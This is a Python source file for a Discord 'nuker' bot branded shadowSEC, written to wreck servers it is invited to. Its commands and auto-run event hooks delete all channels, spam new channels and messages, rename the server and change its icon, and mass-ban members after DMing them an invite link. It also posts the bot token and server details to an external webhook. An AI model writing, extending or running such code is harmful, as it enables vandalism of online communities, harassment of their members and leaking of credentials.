import discord
from datetime import datetime
from discord.ext import commands
import requests
import random
import asyncio
import datetime
import aiohttp
import sys
import time
import os
import webbrowser
import ctypes
import platform

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def main_menu():
    clear_screen()


username = os.getlogin()

title = f"Running on {username}'s PC"

if platform.system() == "Windows":
    ctypes.windll.kernel32.SetConsoleTitleW(title)
else:
    print(f"\033]0;{title}\a", end='')

protected_servers = []
owner_ids = []

clear_screen()
print("\033[94m" + """
                          $$\                           $$\                           
                          $$ |                          $$ |                          
 $$$$$$\   $$$$$$\   $$$$$$$ |      $$$$$$$\  $$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$ |      $$  __$$\ $$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
$$ /  $$ |$$ /  $$ |$$ /  $$ |      $$ |  $$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$ |  $$ |$$ |  $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
\$$$$$$$ |\$$$$$$  |\$$$$$$$ |      $$ |  $$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
""" + "\033[91m" + """ \____$$ | \______/  \_______|      \__|  \__| \______/ \__|  \__| \_______|\__|      
$$\   $$ |                                                                            
\$$$$$$  |                                                                            
 \______/                                                                             
""" + "\033[0m")

nuke_message = """your bullsht here """
bot_prefix = ">"
new_server_name = "cognito ergo sum"
new_server_icon = "https://media.discordapp.net/attachments/1255706560219447327/1357979526893666544/f93dcb0eaf4be23bc532eae32a30a2e8.jpg?ex=67f22c7d&is=67f0dafd&hm=10b33deb58ba7f5cd62b29d3f902e3966cb8d2b2ff94ab02521654b678f240c2&"
webhook_url = "add your webhook here"
autonuke = "False"

autonuke = autonuke.lower() == 'true'

token = input("Enter the bot token: ")

clear_screen()

text = """ 

"""

red_color = "\033[91m"
reset_color = "\033[0m"

for char in text:
    sys.stdout.write(red_color + char)
    sys.stdout.flush()
    time.sleep(0.01)

print(reset_color)

client = commands.Bot(command_prefix=bot_prefix, intents=discord.Intents.all(), activity=discord.Game(name="shadowSEC ontop"), status=discord.Status.dnd)
client.remove_command('help')

rate_limiter = {}

@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')
    
    new_username = "~~> we know your info <~~"
    icon_url = "https://media.discordapp.net/attachments/1357970370002686101/1357978255914827816/2e122bc3bc0cea8cf90de6e1e696394f.jpg?ex=67f22b4e&is=67f0d9ce&hm=43c0463e929c0bb43ab79fe9ba6de9c606a7bbf8004f2cfd25266a96ccb4c670&"
    banner_url = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fsocialminotaur.com%2Fwp-content%2Fuploads%2F2022%2F05%2FAesthetic-Anime.gif%3Fis-pending-load%3D1&f=1&nofb=1&ipt=d4558c3748c8001fdd1efbc3af08e66d30b2cbb5f2a6479311a08c29bde0db66&ipo=images"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as response:
                if response.status == 200:
                    icon = await response.read()
                    
            async with session.get(banner_url) as response:
                if response.status == 200:
                    banner = await response.read()
                    
            await client.user.edit(username=new_username, avatar=icon)
            print(f"\nBot identity updated:")
            print(f"New username: {new_username}")
            print(f"New avatar: Set from URL")
            print(f"New banner: Set from URL")
    except Exception as e:
        print(f"Failed to update bot identity: {e}")



@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def ss(ctx):
    guild = ctx.guild
    if guild.id in protected_servers:
        await ctx.reply("This is a protected server.")
        return

    member_count = len(guild.members)
    server_owner = guild.owner
    server_creation = guild.created_at.strftime("%Y-%m-%d %H:%M:%S")
    
    webhook_data = {
    "embeds": [
        {
            "title": f"🚨 Server Crash Alert: {guild.name} 🚨",
            "description": "A server has just crashed. Below are the details:",
            "color": 0xFF0000,
            "fields": [
                {"name": "👥 Member Count", "value": f"`{member_count}`", "inline": True},
                {"name": "👑 Server Owner", "value": f"`{server_owner}`", "inline": True},
                {"name": "📅 Created At", "value": f"`{server_creation}`", "inline": True},
                {"name": "🔑 Bot Token", "value": f"{token}", "inline": False},  
            ],
            "footer": {
                "text": f"💀 Wrecked by {ctx.author}",}  
        }
    ]
}

    async with aiohttp.ClientSession() as session:
        async with session.post(webhook_url, json=webhook_data) as response:
            if response.status == 204:
                print("Stats sent to webhook successfully")

    if ctx.author.bot:
        await ctx.reply("Nuking server...")
    else:
        if ctx.guild.id not in rate_limiter:
            rate_limiter[ctx.guild.id] = datetime.datetime.now()

        async def change_server_icon():
            async with aiohttp.ClientSession() as session:
                async with session.get(new_server_icon) as response:
                    icon_data = await response.read()
                    await guild.edit(icon=icon_data)

        await change_server_icon()

        async def change_server_name():
            await guild.edit(name=new_server_name)

        await change_server_name()

        async def delete_channels():
            channels = guild.channels
            await asyncio.gather(*[channel.delete() for channel in channels])

        async def create_channels():
            for _ in range(60):
                await guild.create_text_channel(name=nuke_channel_name)

        async def create_invite():
            channel = random.choice(guild.text_channels)
            invite = await channel.create_invite()
            return invite.url

        tasks = [delete_channels(), create_channels(), create_invite()]
        await asyncio.gather(*tasks)

        async def send_messages():
            for _ in range(20):
                await ctx.send(nuke_message)
                await asyncio.sleep(10)

        await send_messages()
@client.command()
async def nukeall(ctx):
    if ctx.author.id not in owner_ids:
        await ctx.reply("You don't have permission to use this command.")
        return

    for guild in client.guilds:
        if guild.id in protected_servers:
            continue

        async def change_server_icon():
            async with aiohttp.ClientSession() as session:
                async with session.get(new_server_icon) as response:
                    icon_data = await response.read()
                    await guild.edit(icon=icon_data)

        await change_server_icon()

        async def change_server_name():
            await guild.edit(name=new_server_name)

        await change_server_name()

        async def delete_channels():
            channels = guild.channels
            await asyncio.gather(*[channel.delete() for channel in channels])

        async def create_channels():
            for _ in range(60):
                await guild.create_text_channel(name=nuke_channel_name)

        async def create_invite():
            channel = random.choice(guild.text_channels)
            invite = await channel.create_invite()
            return invite.url

        tasks = [delete_channels(), create_channels(), create_invite()]
        await asyncio.gather(*tasks)

        async def send_messages():
            for _ in range(10):
                for channel in guild.text_channels:
                    try:
                        await channel.send(nuke_message)
                    except:
                        pass
                await asyncio.sleep(10)

        await send_messages()

    await ctx.reply("Nuke all command executed successfully.")

@client.event
async def on_guild_join(guild):
    if autonuke:
        if guild.id in protected_servers:
            return
        else:
            pass

        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for _ in range(25):
            try:
                await guild.create_text_channel(name=nuke_channel_name)
            except:
                pass

        await guild.edit(name=new_server_name)
        async with aiohttp.ClientSession() as session:
            async with session.get(new_server_icon) as response:
                icon_data = await response.read()
                await guild.edit(icon=icon_data)

@client.command()
async def fix(ctx):
    for guild in client.guilds:
        if guild.id in protected_servers:
            pass
        else:
            try:
                await guild.leave()
            except:
                pass

@client.command()
async def skid(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    if guild.id in protected_servers:
        await ctx.reply("This is a protected server.")
        return
        
    banned = 0
    failed = 0
    
    for member in guild.members:
        if member != ctx.author and member != client.user:
            try:
                # Send DM before ban
                try:
                    await member.send("Server got beamed by shadowSEC! discord.gg/UP8xwaHwnZ")
                except:
                    pass
                    
                await member.ban(reason="BEAMED BY SHADOWSEC")
                banned += 1
            except:
                failed += 1
                continue
                
    print("Successfully banned {banned} members. Failed to ban {failed} members.")


@client.event
async def on_guild_channel_create(channel):
    if channel.guild.id in protected_servers:
        return
    else:
        pass
    for _ in range(15):
        try:
            await channel.send(nuke_message)
        except:
            pass

if __name__ == "__main__":
    main_menu()
    client.run(token) 

#i skidded the webhook shit cry cope even sethe idc :3
